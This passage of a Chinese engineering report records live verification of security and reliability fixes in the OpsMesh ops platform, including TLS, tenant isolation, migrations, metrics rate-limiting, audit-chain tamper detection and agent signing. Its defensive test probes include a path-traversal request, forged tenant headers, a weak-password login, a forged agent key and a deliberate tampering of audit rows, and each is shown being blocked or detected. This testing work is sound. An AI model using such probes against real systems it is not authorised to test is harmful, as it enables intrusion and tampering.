2. **它有一处结论被实测证伪**：第 7 章安全评估将预置弱口令判为「被强制改密机制中和」。实测表明该机制不阻止用已知旧口令改密并取得会话（见 P0-1）。
3. **它修复的同类问题出现回归**：`evaluation-report.md` H2 专门修复过「注释与实现不符」，但本次仍发现同类漂移——`dashboard.go:13` 称个人版「已收敛为极简引导页」，实为 35KB／19 个 tab 的完整 SPA；`stub_guard.go`/`config.go` 注释引用 `sql_p01.go ~ sql_p06.go`，**这些文件不存在**（真实实现为 `sql_ticket.go`/`sql_slo.go` 等按域命名）。**说明「文档漂移」不是一次性修复项，而是需要 CI 持续守住的机制**（建议：把注释中引用的文件名纳入 CI 存在性校验）。

---

## 8. 交付建议

**不要在当前状态下启动正式商用销售。** 但也不需重写——这个项目的底盘是好的：

- 6 个 P0 里，P0-1、P0-2、P0-4 是**配置与文档级**问题，修复成本低（**P0-1、P0-2 已完成，合计 3–6 人天**；P0-4 剩 5–8 人天）而收益极高；
- P0-6 与 P0-5 是**真实缺陷**，但定位精确、改动集中（约 15–25 人天）；
- P0-3 是**交付包装**问题。

**建议路径**：先用 2–3 周完成阶段一，然后**做一次真实客户环境的落地试用**（推荐 1 个网段 / 20–50 台设备），用它来校验阶段二、三的优先级。在完成阶段一之前，任何「生产可用」的对外表述都应撤下——尤其是 `DELIVERY.md` §3 的「全量验证结果 ✅」表格，它验证的是 `go build/vet/test`，与产品能否交付无关。

---

*本报告所有结论均基于对 `F:\Nexus\OpsMesh`（commit `2c87a0b`）的只读静态分析 + 二进制实际运行验证。报告中标注的文件行号在评估时点有效。评估阶段未修改任何项目文件；测试用的临时二进制、证书与进程已全部清理。*

*后续修复实施（P0-1、P0-2，2026-09-25）已改动仓库代码与部署资产，改动清单见 §2 各节「修复交付物」；验证方式均为「编译 → 真机黑盒 → 回归测试全绿」三段式，不依赖静态推断。*

---

## 9. 真机全栈验证记录（2026-09-25，P0-1 / P0-2 / P0-4 / P0-7 收口验收）

> 本节回答的是「修复到底有没有真的交付」。所有数字来自真机执行，命令可复现；断言脚本随仓库交付
> （`deploy/scripts/verify-runtime.sh`，只读、退出码即结论），不依赖评估者本机环境。

### 9.1 被测对象与执行方式

| 项 | 值 |
|---|---|
| 被测量 | `deploy/docker/docker-compose.prod.yml`（生产形态：HTTPS + 加密密钥 + 强口令 + 微服务独立库） |
| 启动命令 | `bash deploy/docker/scripts/deploy.sh up -y`（`-y` = 非交互确认端口占用；占用方即上一次部署的本栈） |
| 启动结果 | **退出码 0**；耗时约 12 分钟（含 10 个镜像重建：控制面 + 9 个微服务）；`[ERROR]` 计数 0 |
| 独立复验 | `bash deploy/scripts/verify-runtime.sh` → **PASS=38 FAIL=0**（退出码 0） |
| 静态门禁 | `bash deploy/scripts/validate-deploy-assets.sh` → **PASS=20 FAIL=0** |
| 冒烟测试 | `deploy.sh` 内置冒烟全绿，含本轮新增的「Prometheus 采集目标全 UP」断言 |

### 9.2 容器矩阵与端口真实性（P0-4 验收）

17 个容器全部 Up（15 个 healthy；`grafana`、`otel-collector` 未定义 healthcheck，由宿主侧 HTTP 探活确认）：

```
aio-svc healthy   alert-svc healthy   auth-svc healthy   blackbox-exporter healthy
config-svc healthy controlplane healthy device-svc healthy gpu-svc healthy
log-svc healthy   loki healthy        mysql healthy      portal-svc healthy
prometheus healthy redis healthy      task-svc healthy   grafana Up   otel-collector Up
```

**关键回归断言**：逐个容器核对 `HostConfig.PortBindings` 与 `NetworkSettings.Ports`，
**没有任何容器「声明了宿主端口却未真实发布」**——这正是本轮定位的 `internal: true`
静默丢弃缺陷的直接探针；缺陷态下会命中 13 个容器 / 15 个端口（见 §2 P0-4 对照实验）。

### 9.3 控制面入口与鉴权链路（P0-1 / P0-2 验收）

| 断言 | 结果 |
|---|---|
| `GET https://127.0.0.1:8080/healthz` | 200（TLS 生效） |
| 明文 `http://…:8080/healthz` | HTTP 400（被 TLS 层拒绝，未进入业务处理）——**不是** 2xx |
| 错误口令登录 | 401 |
| 预置弱口令 `admin123` 登录 | **401**（P0-1 主断言） |
| 正确初始口令登录 | 200 且 `mustChangePassword=true` + 一次性 `changePasswordToken` 齐备 |
| 强制改密期间的会话凭证 | 响应中 `token` 字段为**空字符串**（`docs/operations.md` 承诺「改密前不签发正式 token」——实测吻合）；用该空 token 访问 `/api/v1/devices`、`/api/v1/tasks`、`/api/v1/alerts` 均返回 **401** |
| `X-Tenant-ID` 伪造 | 401（越权头未被信任） |

### 9.4 持久化落库（P0-7 验收）

```
库清单：opsmesh / opsmesh_device / opsmesh_task / opsmesh_alert / opsmesh_config / opsmesh_log
opsmesh          54 张表（users/devices/tasks/audit_log/…）
opsmesh_device    5 张表   opsmesh_task 2 张表
opsmesh_alert     3 张表（alert_rules / alerts / silences）      ← 修复前：0 张表
opsmesh_config    5 张表（config_entries / config_history / …）  ← 修复前：0 张表
opsmesh_log       0 张表（log-svc 按设计走 loki 后端，非缺陷，登记以免误判）
关键表可查：opsmesh.users=3 行；opsmesh_alert.alerts 可查；opsmesh_config.config_entries 可查
```

`opsmesh_alert` / `opsmesh_config` 从「零表」变为「建表成功且可查询」，即 P0-7 的端到端证据：
这两个服务确实跑在 MySQL 上，而不是静默退回内存。

### 9.5 监控真实性（假告警修复验收）

- Prometheus 活动采集目标 **9 个，UP=9 / DOWN=0**，其中 mysql / redis 两个 job 经
  `blackbox-exporter:9115/probe?module=tcp_connect` 探活：
  `target=mysql%3A3306`、`target=redis%3A6379` 均为 `up`。
- 告警接口：**firing=0 / pending=0**（修复前为 5 条常驻 critical 假告警）。

### 9.6 负向验证（证明修复不是「恰好通过」）

| 负向用例 | 期望 | 实测 |
|---|---|---|
| `ALERT_SVC_STORE_TYPE=sql` + 非法 DSN 启动 alert-svc | 拒绝启动 | **EXIT=1**，日志 `MySQL store 初始化失败，停止启动: open mysql: invalid DSN: …`（修复前：打一行日志后以内存存储继续服务） |
| 把 `ensureParseTime` 还原为旧实现后跑 `dsn_test.go` | 测试变红 | 变红（证明测试有守护力，非恒真） |
| 门禁负向：人为给带宿主端口的服务挂 `internal: true` 网络 | 门禁失败并点名 | 门禁 FAIL，点名 8 个服务（`validate-deploy-assets.sh` §4 不变式） |
| 明文 HTTP 断言 | 只接受连接层拒绝或 TLS 层拒绝 | 断言显式接受 `000`/`400`，仅 1xx/2xx/3xx 判回归——避免把「Go TLS 服务器的 400 标准回应」误判为漏洞 |

### 9.7 本轮未修的运行时观察（如实记录，非阻断）

1. `GET https://<controlplane>:8080/metrics` **无需鉴权即返回 200**，暴露 `opsmesh_devices_total` /
   `opsmesh_tasks_total` / `opsmesh_alerts_active` / `opsmesh_tickets_open` 等聚合计数（对应 §3 P1-5 面）。
   建议：默认只绑 loopback 或加抓取白名单 + 限流。
2. ~~登录在 `mustChangePassword=true` 时仍同时下发会话 token~~ —— **已实测排除**：`token` 字段为空串，
   空 token 访问业务接口一律 401，与 `docs/operations.md` 的承诺一致（本报告初稿的此条为脚本误判：
   脚本原先只匹配键名，未判值是否非空；断言已改为「非空 token 才判失败」）。
3. ~~控制面工厂 `internal/controlplane/factory/server_factory.go` 对 M3/M5 子存储仍保留「构造失败退内存」的路径（§3 P1-8）。~~ —— **已修**：生产模式改为 fail-fast（见 §10.5）。

---

## 10. 真机全栈验证记录（2026-09-25 第二批：P0-3 / P0-5 / P0-6 / P1-8 收口验收）

第二批修复的验收标准与第一批一致：**以真机把生产栈跑起来为准，不以静态结论收口**。

### 10.1 被测对象与执行方式

```
交付物重建：docker compose -f docker-compose.prod.yml build controlplane   → EXIT=0
            （含新增 node:22-alpine 构建阶段；npm ci + npm run build + test -f dist/index.html 全过）
全栈重部署：bash scripts/deploy.sh up -y                                   → EXIT=0
            17 容器全 Up/healthy；构建 15 个服务镜像后重新拉起；冒烟测试（含 gRPC TLS 握手）通过
独立断言：  bash deploy/scripts/verify-runtime.sh                          → PASS=58  FAIL=0
静态门禁：  bash deploy/scripts/validate-deploy-assets.sh                  → PASS=20  FAIL=0
```

### 10.2 企业版前端交付（P0-3 验收）

镜像内已真实内置企业版前端（非占位），逐项实测：

| 断言 | 实测 |
|---|---|
| `GET https://127.0.0.1:8080/enterprise/` | **200**，`Content-Type: text/html; charset=utf-8`，`Cache-Control: no-cache, no-store, must-revalidate`，CSP 含每请求 nonce |
| 是否占位页 | 响应头**无** `X-OpsMesh-Enterprise-Bundle: placeholder`，body **无** `OPSMESH_ENTERPRISE_BUNDLE_PLACEHOLDER` → 真实构建产物 |
| SPA 入口引用的资源 | `/enterprise/assets/js/index-DZhQRfLW.js` → **200** |
| `assets` 缓存策略 | `Cache-Control: public, max-age=31536000, immutable` |
| 预压缩协商（br） | `Content-Encoding: br` + `Vary: Accept-Encoding`，**9189B**（未压缩 37430B，压缩率 75%） |
| 预压缩协商（gzip） | `Content-Encoding: gzip`，**10640B**（未压缩 37430B） |
| SPA 深链回退 | `GET /enterprise/devices` **200**，与外壳响应体 **md5 逐字节一致**（`711f142a…`） |
| 缺失分包 | `GET /enterprise/assets/__missing__.js` → **404**（未回退 HTML） |
| 路径穿越 | `--path-as-is /enterprise/assets/../../healthz` → **307**（被 ServeMux 归一，未命中前端资源） |
| 个人版引导页入口 | `GET /` 响应含 `href="/enterprise/"` 且无标记残留 |

### 10.3 迁移安全（P0-5 验收）

| 断言 | 实测 |
|---|---|
| 库内版本 vs 磁盘迁移文件 | `schema_migrations` 最大版本 **18** == 磁盘迁移文件 **18** 个 → 无漏跑 |
| 防篡改基线 | 18 条已应用迁移的 `checksum` **均非空** |
| 回滚脚本齐备 | `up=18 / down=18`（每个迁移随附 `.down.sql`） |
| 真实 MySQL 集成测试 | 库内 13 个迁移集成测试 **13/13 通过**（`TestRunMigrations*` / `TestMigrationLock_ExcludesOtherSession` / `TestRunMigrations_ConcurrentStores` / `TestMigrationDownScripts_UnwindChain` 整链回滚等） |
| 全套带 DSN 的分支 | `internal/store`(375s) / `internal/controlplane`(50s) / `internal/logstore` / `pkg/auth` 全绿 → EXIT=0 |

### 10.4 多租户隔离（P0-6 验收）

| 断言 | 实测 |
|---|---|
| `users.tenant_id` 列 | 存在；**历史行已回填**（空租户用户数 = 0） |
| `tasks.tenant_id` 列 | 存在（领取侧 SQL 租户过滤可生效） |
| 伪造租户头 → 设备列表 | 仅带 `X-Tenant-ID: attacker-tenant`：**401** |
| 伪造租户头 → 用户管理 | 仅带 `X-Tenant-ID: attacker-tenant`：**401** |
| JWT 携带租户 | `tenant_users_test.go:205` 断言登录签发的 JWT 经 `tenantFromBearer` 解出正确租户（随带 DSN 的 controlplane 全量测试通过） |

### 10.5 P1-8（M3/M5 子存储失败不再静默降级）

工厂在生产模式下对 M3/M5 子存储构造失败改为 fail-fast，与 `--production` / `StoreType=sql` 的既有阻断先例一致；`server_factory_test.go` 覆盖两分支。

### 10.6 本轮自查抓到并修复的缺陷（说明断言不是橡皮图章）

**gzip 预压缩旁路静默失效**：`negotiatedEncoding` 返回的编码名被直接当作旁路文件后缀拼接，
gzip 分支去找 `x.js.gzip`（实际文件是 `x.js.gz`）→ 未命中 → 静默退回**未压缩原文**。
服务端仍返回 200、无任何错误码，只表现为传输体积翻约 3.5 倍——正是「看起来通过、实际没生效」的典型。

- **发现方式**：不是静态读代码，而是对同一 URL 做 `identity` / `br` / `gzip` 三种 `Accept-Encoding`
  的**体积与 `Content-Encoding` 双比对**。
- **修复**：`negotiatedEncoding` 改为返回 `(encoding, suffix, ok)` 两个独立值（头值 `gzip` ≠ 后缀 `gz`）。
- **加固**：单元测试补 gzip 头值/后缀映射、已压缩路径不二次协商、旁路体必须小于原文；
  运行时脚本对 `br` 与 `gzip` 逐编码断言「声明了对应编码 **且** 体积确实变小」。
- **修复后实测**：`br 9189B / gzip 10640B < 未压缩 37430B`，两者均带正确 `Content-Encoding`。

### 10.7 本轮清理（不留测试残留）

- 为跑真实 MySQL 集成测试临时创建的 `migtest` 库用户**已删除**（`mysql.user` 中已无此用户），
  临时库 `test_migration_*` 已全部 DROP（`information_schema.schemata` 中 0 条）。
- 企业版前端构建产物落在 `internal/controlplane/embed/enterprise/`，由嵌套 `.gitignore`
  白名单化（仅 `placeholder.html` + `.gitignore` 入库），`git status -uall` 该目录下**仅这两个文件**，
  构建产物不可能被误提交。

---

## 11. 真机全栈验证记录（2026-09-25 第三批：P1-1 / P1-4 / P1-5 收口验收）

执行方式：`bash deploy/docker/scripts/deploy.sh up -y`（全量重建 17 容器，冒烟测试通过）
→ `bash deploy/scripts/verify-runtime.sh`（断言脚本已扩容至 **69 项，PASS=69 / FAIL=0**）
→ 另加一次性探针容器的定向负向实验（见 11.3）。

### 11.1 P1-5 指标 DoS 收敛（四层修复的逐项实证）

| 断言 | 实测结果 |
|---|---|
| 宿主 8080 `GET /metrics` | 200（来源落在 `METRICS_ALLOW_CIDR` 内） |
| 9091 `GET /metrics`（Prometheus 抓取路径） | 200，303 行；Prometheus target `controlplane:9091` = `up` |
| `opsmesh_http_metrics_series` | 16（硬上限 2000 内，且随请求数线性增长已不可能） |
| `opsmesh_http_metrics_series_dropped_total` | 已暴露（超限请求可观测，用于「本端点正被扫描」告警） |
| 请求 `/api/v1/<66 字节随机段>` | 归一为 `path="/api/v1/:id"`；原始 66 字节串**未出现**在指标文本中（无标签膨胀） |
| 请求 `/<221 字节路径>` | 归一为 `path="/:overlong"` |
| 生产默认限流启动日志 | `[config] 提示：生产模式默认启用 API 限流 200 req/s/IP` + `API 限流已启用 ratePerSec=200` |
| 限流突发实测 | 单连接复用连打 800 次 `/api/v1/devices` → **429=429、非 429=371**（令牌桶生效） |
| fail-closed 负向验证 | 探针容器白名单=127.0.0.1/32 → **403**，拒绝日志 `msg=metrics 访问被拒（不在 CIDR 白名单） remote=172.28.1.1:40360` |

### 11.2 断言自身的假阴性（自查记录）

首轮 3e 限流断言用 `xargs -P 80` 逐请求起 `curl` 进程打 1500 次突发，结果**无一 429**。
排查后确认不是限流未生效，而是 Windows 上进程创建开销把实际速率压到 ~200 req/s 边界
（对照实验：单条 curl 复用 keep-alive 连接连打 600 次耗时 0.80s，其中 273 次 429）。
断言已改为单连接突发（800 次），并把这条「假阴性」写进脚本注释——避免后人重踩。

### 11.3 部署形态边界（实测发现，需在交付文档中如实说明）

Docker Desktop(WSL2) 的端口转发**不保留真实来源 IP**。用一次性探针容器（白名单仅 `127.0.0.1/32`）
做对照实验，三种来源在容器侧观察到的 `remote` 均为 **172.28.1.1**（frontend 网桥网关）：

| 来源 | 结果 |
|---|---|
| 宿主 `curl http://127.0.0.1:29191/metrics` | 403，`remote=172.28.1.1:51578` |
| 宿主经局域网 IP `http://192.168.10.201:8080/metrics` | 对被测栈返回 200（来源同为网关，落在 172.28.0.0/16 内） |
| 默认桥容器经 `host.docker.internal:9091/metrics` | 200（同上） |

结论（已写入 `docker-compose.prod.yml` 注释与 `docs/operations.md`）：
1. `METRICS_ALLOW_CIDR` 必须包含 `172.28.0.0/16`，否则**连宿主都抓不到**（探针实验已证）；
2. 该部署形态下 CIDR 白名单**不具备来源区分能力**，真正的边界是「端口只发布到 `127.0.0.1`」+ 宿主防火墙；
   来源区分只在裸机/systemd（真实 IP 保留）与 K8s（Pod IP）部署下成立；
3. 因此本次修复把「生产模式空 CIDR = fail-closed」设为默认，避免客户以为配了白名单就等于有边界。

### 11.4 静态门禁与单元测试

- `deploy/scripts/validate-deploy-assets.sh`：**PASS=20 / FAIL=0**（含 Helm 渲染后新参数
  `--metrics-allow-cidr` / `--cb-rate-limit-per-sec` 的出现性校验）。
- `go test ./internal/agent/ ./internal/store/ ./internal/metrics/ ./internal/config/ ./internal/controlplane/`：全绿
  （agent 53.1s、store 39.6s、controlplane 40.6s；`-race` 因 Windows 无 cgo 未启用，已在报告中注明）。

---

## 12. 真机全栈验证记录（2026-09-25 第四批：P1-3 收口验收）

执行方式：重建控制面镜像（本地 11:28，晚于本批最后一次源码改动 11:21，避免验到旧二进制）
→ `bash deploy/docker/scripts/deploy.sh up --no-build -y`（复用已建镜像，17 容器就绪）
→ `bash deploy/scripts/verify-runtime.sh`（断言已扩容至 **86 项，PASS=86 / FAIL=0**）
→ 另加**在线篡改—自检—告警—恢复**全周期实证（12.4）。

### 12.1 落库与迁移（迁移 019 生效）

| 断言 | 实测结果 |
|---|---|
| `schema_migrations` 最高版本 | `19`，checksum `05ad9446cc5751a9…`（与仓库内 `019_audit_chain.sql` 一致） |
| `audit_log` 链式列 | `prev_hash` / `entry_hash` 均存在 |
| 新增表 | `audit_chain_head`（单行 id=1）、`audit_log_archive`、`audit_archive_meta` 均建 |
| 新增索引 | `idx_audit_tenant_created`（(tenant_id, created_at) 复合）、`idx_audit_entry_hash` |
| 控制面启动参数 | `--audit-retention-days=180`（来自 `.env` 的 `AUDIT_RETENTION_DAYS`，证明 `.env → compose → flag` 全链路接线） |
| 在线库现状 | `audit_total=26`、`chained=11`、`legacy=15`、`archived=0`（保留期 180 天，无超龄行可归档） |
| 链头一致性 | `audit_chain_head.last_hash == 最新链式行 entry_hash` → `1` |

`legacy=15` 为迁移 019 之前写入的历史行，**如实计数不伪造**：自检把它们计为未纳链遗留，
断言脚本对其给 `[WARN]` 而非 `[PASS]`，避免「全绿」掩盖存量数据未纳链的事实。

### 12.2 静态门禁与单元测试（真实 MySQL 8.0.46）

- `gofmt -l internal/store/` 空、`go vet ./internal/store/` 无输出。
- `OPSMESH_TEST_MYSQL_DSN=… go test ./internal/store/ -count=1`
  → **`ok github.com/Levango7/OpsMesh/internal/store 176.791s`，exit 0**（全量含 8 个审计链集成用例）。
- 审计链集成用例改为共享临时库（`TestMain` 统一回收）后，8 个用例合计由 93.7s 降至 **11.4s**，
  避免 CI `-race -timeout 900s` 预算被单包吞掉；运行后 `SHOW DATABASES` 无 `test_auditchain_*` 残留。
- 淘汰/缓冲上限用例 `-count=5` 连跑确定性通过（见 12.5 第 1 条）。
- `promtool check rules /etc/prometheus/alerts.yml` → **SUCCESS: 12 rules found**（含新增审计链告警组）。

### 12.3 `verify-runtime.sh` 第 13 节（P1-3 专项断言，逐条实测）

```
=== 13. 审计链防篡改与保留策略（P1-3 回归） ===
  [PASS] audit_log 已落 prev_hash/entry_hash 链式列
  [PASS] 表 audit_chain_head 已建
  [PASS] 表 audit_log_archive 已建
  [PASS] 表 audit_archive_meta 已建
  [PASS] audit_log.idx_audit_entry_hash 已建（链式窗口查询不全表扫）
  [PASS] audit_chain_head 单行链头就绪（多副本串行化基线）
  [PASS] 最新审计行已带 entry_hash（运行期链式写入生效）
  [PASS] 链头 last_hash == 最新链式行 entry_hash（链头跟随，尾部未被删改）
  [WARN] 有 15 条链前遗留行（迁移 019 之前写入，未纳入链，自检会如实计数）
  [PASS] 控制面已接线保留策略（audit-retention-days=180）
  [PASS] GET /api/v1/audit/verify 未认证 → 401（端点已注册且受鉴权保护）
  [PASS] 指标 opsmesh_audit_chain_supported 已暴露
  [PASS] 指标 opsmesh_audit_chain_ok 已暴露
  [PASS] 指标 opsmesh_audit_chain_checked_rows 已暴露
  [PASS] 指标 opsmesh_audit_chain_checks_total 已暴露
  supported=1 ok=1 checked_rows=10 checks_total=1
  [PASS] 链自检已实际执行（checks_total=1，leader 循环在跑）
  [PASS] 存储后端支持链式校验（supported=1）
  [PASS] 链自检结论自洽（ok=1）
```

### 12.4 在线篡改—自检—告警—恢复全周期实证（本轮最强证据）

不经任何测试夹具：直接改写**在线库**一行已纳链审计记录的内容，观察**已部署二进制**的
leader 后台自检（60s 周期）能否发现、定位、导出指标、触发告警，再恢复并确认自动复原。

目标行：`id=26`（`action=user_login`，原 `detail='username=admin'`，无引号等特殊字符，便于精确还原）。

| 动作时刻（UTC） | 动作 | 观测时刻与结果 |
|---|---|---|
| （篡改前一次抓取） | 取基线 | `ok=1 supported=1 checked_rows=11 checks_total=2` |
| 03:31:32 | `UPDATE audit_log SET detail='username=admin_TAMPERED' WHERE id=26` | — |
| 03:32:47 | 等下一个自检周期（60s） | `ok=1 → 0`，`checks_total → 3`；控制面 ERROR 日志：`first_bad_id=26`、`reason="id=26 的 entry_hash 与内容重算结果不一致（行内容被改写）"` |
| 03:32:55 | 还原 `detail='username=admin'`（长度 14，与原值一致） | 03:34:10 `checks_total → 5`、`ok → 1`，其后 90s 内无新告警日志 |
| 03:34:20 | 二次篡改（验证告警通道，需跨越 `for: 5m`） | 03:35:17 Prometheus 记为 `activeAt`（规则进入 pending） |
| 03:41:26 | 等满 5 分钟后观测 | 03:41:20 状态 **firing**，`severity=critical`（`/api/v1/alerts` 仅此 1 条） |
| 03:41:26 | 还原并等待 90s | 03:42:56 `ok=1`、`checks_total=14`；`/api/v1/alerts` → **firing/pending 告警数 0**（自动恢复） |

结论：**防篡改不是静态配置，而是可复现的运行时行为**——改写一行即被定位到具体 `id`，
指标翻转、critical 告警触发，恢复后自动收敛。目标行已精确还原，收尾状态
`audit_total=26 / chained=11 / legacy=15 / archived=0`、链头与最新链式行一致（=1）。

### 12.5 本轮自查抓到并修复的缺陷（说明断言与测试不是橡皮图章）

1. **P1-4 设备指标淘汰使用墙钟排序 → 淘汰不确定**（生产代码缺陷，非测试问题）。
   全量 store 套件暴露 `TestStoreDeviceMetrics_RecentlyWrittenSurvives` 间歇失败：
   `lastWrite` 取自墙钟，Windows 上 `time.Now()` 粒度约 15.6ms，同一 tick 内多个条目并列，
   淘汰顺序退化为 Go map 随机遍历。修复：引入单调原子序号 `writeSeq`（`atomic.Uint64`）
   作为淘汰依据，与墙钟彻底解耦；文件 `internal/store/memory_bounds.go`、
   `memory_middleware_template.go`、`memory.go`。
2. **同用例的断言前提本身是错的**（测试缺陷）。旧写法在「灌满 > 刷新 veteran」的顺序下，
   按 LRU 语义 veteran 本就该被淘汰——旧实现只是靠时钟并列「侥幸通过」。已重写为语义正确的
   场景（预载 `maxTrackedDeviceMetrics-10` → 刷新 veteran → 再写 20 个 → 断言 veteran 存活、
   `d-0` 被淘汰、总数不超过上限）。
3. **告警规则升级后静默不生效**（交付/运维缺陷）。`alerts.yml` 以 bind mount 注入，
   容器未重建时 Prometheus **不会**自动重读：实测新增的 `opsmesh_audit_chain_alerts` 组
   一直未加载，手动 `POST /-/reload` 后才出现（`--web.enable-lifecycle` 已开启）。
   修复：`deploy.sh` 的 `start_observability()` 在 Prometheus 就绪后自动热加载，
   失败则显式 WARN——否则客户升级后新旧规则混用而无任何提示。
4. **多租户冒烟用例在真实库留下残留库**（测试卫生）。`TestMultiSchemaSmoke_MySQLDSNBranch`
   创建的 `opsmesh_tenant_sqlsmokea/b` 从不回收，历次运行持续堆积。已加 `t.Cleanup`
   按 namer 反推库名并 `DROP DATABASE`，实测跑完 `SHOW DATABASES` 已归零。

### 12.6 本轮未覆盖 / 诚实边界

- **未在在线栈上取得已认证的 200/409 响应**：三个种子用户（admin/operator/viewer）均处于
  P0-1 的「首登强制改密」态，无可用会话 token；为不改动交付态口令（会让断言脚本第 4 节的
  `mustChangePassword=true` 期望失效），未走改密流程换取 token。该端点的 200/409/501/500
  分支由 handler 单测 + 真实 MySQL 集成用例覆盖，在线仅断言了 401 鉴权门；平台级
  「定位首个坏行」的语义则由 12.4 的后台自检端到端证明（同一 `VerifyAuditChain` 代码路径）。
- **告警仅在 Prometheus 内 firing，未接 Alertmanager**：仓库 compose 中 Alertmanager 仍为
  可选未启用（注释保留），故「触发告警」止于 Prometheus 规则状态，未验证到邮件/webhook 投递。
- **无密钥链的固有边界**：持 DB 写权限者可重写整条链并重算全部 `entry_hash`（无 WORM/外部锚定）。
  本批如实写入 `docs/security-mechanism.md` §7.7，未内置外部锚定。
- `-race` 仍因 Windows 无 cgo 无法本地启用；CI integration job 已在 MySQL 8 + Redis 上带 `-race` 跑 store 包。

---

## 13. 真机全栈验证记录（2026-09-25 第五批：P1-2 收口验收）

执行方式：以本批**最终源码**重建控制面镜像 → `bash deploy/docker/scripts/deploy.sh up -y`（17 容器全 Up，
冒烟测试通过）→ `bash deploy/scripts/verify-runtime.sh`（断言已扩容至 **94 项：PASS=94 / FAIL=0**）
→ `bash deploy/scripts/validate-deploy-assets.sh`（**PASS=20 / FAIL=0**）
→ 真实 MySQL 8.0.46 上 `internal/store` 全量套件 → 另加 agent 侧五组端到端实测（13.1–13.5）。

> 顺序说明：先完成全部源码改动（含 13.6 / 13.7 两项实测发现的缺陷修复）并重建部署，再跑断言脚本——
> 上文的 94 项与 20 项均取自**冻结后的最终代码**，不存在「验完又改」的时间差。

### 13.1 per-agent 密钥下发与落盘

| 断言 | 实测结果 |
|---|---|
| 全新纳管（一次性 install token + TLS） | 注册响应 `signed=true`、`keySource=register-response` |
| 密钥落盘 | `<dataDir>/agent.key` **64 字节**（该文件在重启后仍被沿用，见 13.4） |
| agent 侧错误 | `level=ERROR` 计数 **0** |
| 库内 per-agent 密钥 | `agents` 表 5/5 行 `secret` 非空（断言脚本 14c 实测） |

### 13.2 签名覆盖载荷（端到端 + 负向）

- **正向**：签名 agent 领取并执行真实 shell 任务 `task-1790322380049322603` → 经
  `GET /api/v1/tasks/{id}/result` 黑盒读取结果 `exit: 0`、`stdout: 'p12-signed-result-ok'`。
- **指标结构**：`opsmesh_agent_signature_verifications_total{alg="v2",result="ok"}` 随流量增长
  （收口复跑 **185**）；`alg="v1"` 恒 **0**、`source="fleet"` 恒 **0**、`source="per_agent"` 与 `v2/ok` 同值
  ——即全部业务流量走 **per-agent 密钥 + 覆盖载荷的 v2**。
- **负向（错密钥）**：`p12-badkey`（已知 agentID + 伪造 `agent.key=deadbeef…`）启动后 18 秒内，
  控制面 `v2/rejected` 由 **0 → 11**，agent 侧 `心跳 ok` 计数 **0**、错误串
  `Unauthenticated desc = agent-signature mismatch: HMAC verification failed`（心跳/领任务/取消轮询全被拒）。
  - **诚实说明**：更早一轮曾在旧镜像上测到 `v2/rejected` 0→20，但该计数随容器重建归零；为不把
    「上一轮读数」当成本轮证据，此处在本批最终代码上**重跑了同一条负向用例**取数。

### 13.3 任务子进程环境隔离（端到端）

任务 `task-1790322380202017385` 的 cmd 为 `echo OPSKEY=[%OPSMESH_GRPC_SIGNATURE_KEY%] CANARY=[%P12_ENV_CANARY%] USER=[%USERNAME%] HOME=[%USERPROFILE%]`，
实测 `exit: 0`、`stdout`：

```
OPSKEY=[%OPSMESH_GRPC_SIGNATURE_KEY%] CANARY=[%P12_ENV_CANARY%] USER=[winge] HOME=[C:\Users\winge]
```

- 前两项**未被展开** = 这两个变量在任务子进程环境里根本不存在（修复前 `set` 可直接读到 agent 全量环境）。
- 后两项正常展开 = 白名单未误伤运行必需变量；`USERNAME` 的补入由此实测确认（补入前 `%USERNAME%` 输出字面量）。

### 13.4 重启身份连续性（已消费 install token）

杀掉 agent 进程后原样重启（`<dataDir>/install.token` 129 字节仍在，且已被首轮注册消费）→
注册成功、`signed=true`、`keySource=agent.key`、`ERROR` 计数 0；控制面打印限次 WARN
「install token 已消费或失效，按已知 agent 重注册处理（沿用库内租户、不下发密钥）」。
即：修复前该场景 agent 会 fail-fast 退出，纳管机器重启即永久失联。

### 13.5 断言脚本第 14 节（8 条，逐条实测）

| # | 断言 | 实测 |
|---|---|---|
| 14a | 交付资产已接线签名验证 | `OPSMESH_GRPC_REQUIRE_SIGNATURE=true` |
| 14b-1 | 验签指标全标签集（8 条时序，含 0 值） | PASS |
| 14b-2/3 | 密钥来源指标 `source=per_agent` / `source=fleet` | PASS |
| 14b-4 | 已有 agent 用 v2 通过验签 | `v2/ok=185` |
| 14b-5 | 无 v1 遗留算法流量 | `v1/ok=0` |
| 14b-6 | 无全舰队预共享密钥兜底 | `source="fleet"=0` |
| 14c | 已注册 agent 持 per-agent 密钥 | 5/5 |

### 13.6 本轮实测发现并修复的 **P0 级可用性缺陷**：agent 通道被租户门禁全量拒绝

| 项 | 内容 |
|---|---|
| 现象 | 出厂生产形态（`OPSMESH_REQUIRE_AUTH=true` + `OPSMESH_GRPC_REQUIRE_SIGNATURE=true`）下，agent **注册成功但所有业务 RPC 被拒**：`Unauthenticated: missing tenant context: gateway auth required (--require-auth)` → 心跳、领任务、上报结果、上报日志、取消轮询**全部不可用**，即任务下发与结果上报完全不可用（真机复现：注册 1 次成功后，心跳/领任务/取消轮询连续失败） |
| 根因 | `--require-auth` 的语义是「要求**网关**注入租户」（见 flag 帮助与 `docs/api-reference.md`），但 agent 是**拉模型**——直连 gRPC 9090、不经 HTTP 网关，既无租户配置项，`RegisterResp` 也不含租户字段。该检查对 agent 通道本就不可能满足 |
| 为何此前未暴露 | E2E 夹具 `grpc_sig_test.go` 用 `RequireAuth: false`，而出厂 compose 用 `true` —— **测试配置与交付配置不一致**，把缺陷挡在了测试之外（该夹具已改为 `true` 以对齐出厂形态） |
| 修复 | `CheckAgentTenant` 在 ctx 无租户时取「注册时盖章的库内归属租户」（由 install token / 库内记录确定，**非 agent 自报**）；**不放松任何既有拒绝路径**：声明租户且与归属不一致 → 仍 `PermissionDenied`；未知 agent 且无租户 → 仍 `Unauthenticated`；库内归属为空且无租户 → 仍拒绝。补 2 个单测（放行 / 维持拒绝） |
| 安全论证 | 被取代的「必须自带 `x-tenant-id` 元数据」**从来不是安全边界**：该元数据不带签名，能伪造身份的调用方本可直接填上正确租户通过旧检查。真正的身份边界是 `verifyAgentSignature`（v2 覆盖载荷）与 mTLS |
| 反向验证 | 临时把修复回退为「无租户一律拒绝」→ `TestCheckAgentTenant_AgentBindingFallback` 与 `TestGRPCAgentIdentityBinding_TLS_EndToEnd` 两个用例按**实测同一错误串**失败；还原后全绿（证明该断言不是橡皮图章） |
| 残留限制 | gRPC `CancelTask` 仍要求 ctx 自带租户（该 RPC 无库内绑定可推导，且当前无任何调用方）；后续若为其接入 agent 侧调用，须按同一思路改造 |

